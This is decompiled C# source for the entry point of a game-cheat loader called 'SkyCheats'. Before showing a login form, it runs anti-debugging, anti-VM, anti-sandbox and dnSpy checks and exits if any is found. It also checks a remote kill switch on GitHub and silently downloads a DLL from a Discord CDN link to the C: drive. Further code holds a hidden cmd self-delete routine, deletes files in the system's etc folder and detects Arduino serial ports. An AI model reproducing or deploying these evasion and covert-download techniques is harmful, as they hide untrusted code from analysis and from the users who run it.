using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AntiDebugging;
using Loader.Security.AntiDebug;
using Loader.Security.AntiDump;

namespace SkyCheats
{
	// Token: 0x02000012 RID: 18
	internal static class Program
	{
		// Token: 0x06000135 RID: 309
		[DllImport("kernel32", EntryPoint = "SetProcessWorkingSetSize")]
		private static extern int OneWayAttribute([In] IntPtr obj0, [In] int obj1, [In] int obj2);

		// Token: 0x06000136 RID: 310 RVA: 0x0000670C File Offset: 0x00004B0C
		internal static bool IsSandboxie()
		{
			return Sandboxie.IsSandboxie();
		}

		// Token: 0x06000137 RID: 311 RVA: 0x00006724 File Offset: 0x00004B24
		internal static bool IsVM()
		{
			return CommonAcl.SecurityDocumentElement();
		}

		// Token: 0x06000138 RID: 312 RVA: 0x0000673B File Offset: 0x00004B3B
		internal static void IsDebugger()
		{
			DebuggerAcl.Run();
		}

		// Token: 0x06000139 RID: 313 RVA: 0x00006744 File Offset: 0x00004B44
		internal static bool IsdnSpyRun()
		{
			return DnSpy.ValueType();
		}

		// Token: 0x0600013A RID: 314 RVA: 0x0000675C File Offset: 0x00004B5C
		internal static bool IsEmulation()
		{
			int num = new Random().Next(3000, 10000);
			DateTime now = DateTime.Now;
			Thread.Sleep(num);
			bool flag = (DateTime.Now - now).TotalMilliseconds >= (double)num;
			return !flag;
		}

		// Token: 0x0600013B RID: 315 RVA: 0x000067B8 File Offset: 0x00004BB8
		internal static void SelfDelete()
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + Assembly.GetExecutingAssembly().Location + "\"")
			{
				WindowStyle = ProcessWindowStyle.Hidden
			});
			if (process != null)
			{
				process.Dispose();
			}
			Process.GetCurrentProcess().Kill();
		}

		// Token: 0x0600013C RID: 316 RVA: 0x00006810 File Offset: 0x00004C10
		private static void WellKnownSidType()
		{
			IntPtr handle = Process.GetCurrentProcess().Handle;
			for (;;)
			{
				do
				{
					Thread.Sleep(16384);
					GC.Collect();
					GC.WaitForPendingFinalizers();
				}
				while (Environment.OSVersion.Platform != PlatformID.Win32NT);
				Program.OneWayAttribute(handle, -1, -1);
			}
		}

		// Token: 0x0600013D RID: 317 RVA: 0x00006868 File Offset: 0x00004C68
		private static string AutodetectArduinoPort()
		{
			ManagementScope scope = new ManagementScope();
			SelectQuery query = new SelectQuery("SELECT * FROM Win32_SerialPort");
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, query);
			int num = 0;
			try
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					num++;
					string text = managementObject["Description"].ToString();
					Program.desca = text;
					string result = managementObject["DeviceID"].ToString();
					Program.deviceIda = result;
					bool flag = text.Contains("Arduino") || text.Contains("Leonardo");
					if (flag)
					{
						return result;
					}
				}
			}
			catch (ManagementException ex)
			{
				ex = new ManagementException();
			}
			bool flag2 = num == 1;
			string result2;
			if (flag2)
			{
				bool flag3 = Program.deviceIda == "COM1";
				if (flag3)
				{
					result2 = null;
				}
				else
				{
					result2 = Program.deviceIda;
				}
			}
			else
			{
				bool flag4 = num == 2;
				if (flag4)
				{
					result2 = Program.deviceIda;
				}
				else
				{
					result2 = null;
				}
			}
			return result2;
		}

		// Token: 0x0600013E RID: 318 RVA: 0x000069A4 File Offset: 0x00004DA4
		private static void sadsa()
		{
			AntiDumpHandler.InitializeDump();
			Anti_Dbg.Initialize();
			bool flag = Program.IsSandboxie() || Program.IsVM() || Program.IsdnSpyRun() || Program.IsEmulation() || AntiDebug.DetachFromDebuggerProcess() || AntiDebug.HideThreadFromDebugger(Program.GetCurrentProcess()) || AntiDebug.CheckDebuggerManagedPresent() || AntiDebug.CheckDebuggerUnmanagedPresent() || AntiDebug.CheckDebugPort() || AntiDebug.CheckKernelDebugInformation() || AntiDebug.CheckRemoteDebugger();
			if (flag)
			{
				Environment.Exit(0);
			}
		}

		// Token: 0x0600013F RID: 319 RVA: 0x00006A20 File Offset: 0x00004E20
		private static void asdsasa()
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://github.com/Dola123312/ahasdasb/blob/main/README.md");
			WebResponse response = httpWebRequest.GetResponse();
			StreamReader streamReader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
			string text = streamReader.ReadToEnd();
			streamReader.Close();
			response.Close();
			bool flag = text.Contains("clearwebjkjwegnwejbwebjowegnowegnonwegonowegnoıwegnoıwegnoıwegnoıwegnıo");
			if (flag)
			{
				Environment.Exit(0);
			}
		}

		// Token: 0x06000140 RID: 320 RVA: 0x00006A88 File Offset: 0x00004E88
		private static void host_clear()
		{
			try
			{
				string path = "C:\\Windows\\System32\\drivers\\etc\\hosts.ics";
				string path2 = "C:\\Windows\\System32\\drivers\\etc\\lmhosts.sam";
				bool flag = File.Exists(path);
				if (flag)
				{
					File.SetAttributes(path, FileAttributes.Normal);
					File.Delete(path);
				}
				bool flag2 = File.Exists(path2);
				if (flag2)
				{
					File.SetAttributes(path2, FileAttributes.Normal);
					File.Delete(path2);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000141 RID: 321
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetCurrentProcess();

		// Token: 0x06000142 RID: 322 RVA: 0x00006AFC File Offset: 0x00004EFC
		[STAThread]
		private static void Main()
		{
			Thread thread = new Thread(new ThreadStart(Program.sadsa));
			Thread thread2 = new Thread(new ThreadStart(Program.IsDebugger));
			thread.Start();
			thread2.Start();
			Program.asdsasa();
			try
			{
				bool flag = !File.Exists("C:/ugubuga.dll");
				if (flag)
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile("https://cdn.discordapp.com/attachments/951491932796903478/962052918545109062/ugubuga.dll", "C:/ugubuga.dll");
				}
			}
			catch (Exception)
			{
			}
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new Login_Form());
		}

		// Token: 0x0400009B RID: 155
		public static string desca;

		// Token: 0x0400009C RID: 156
		public static string deviceIda;
	}
}
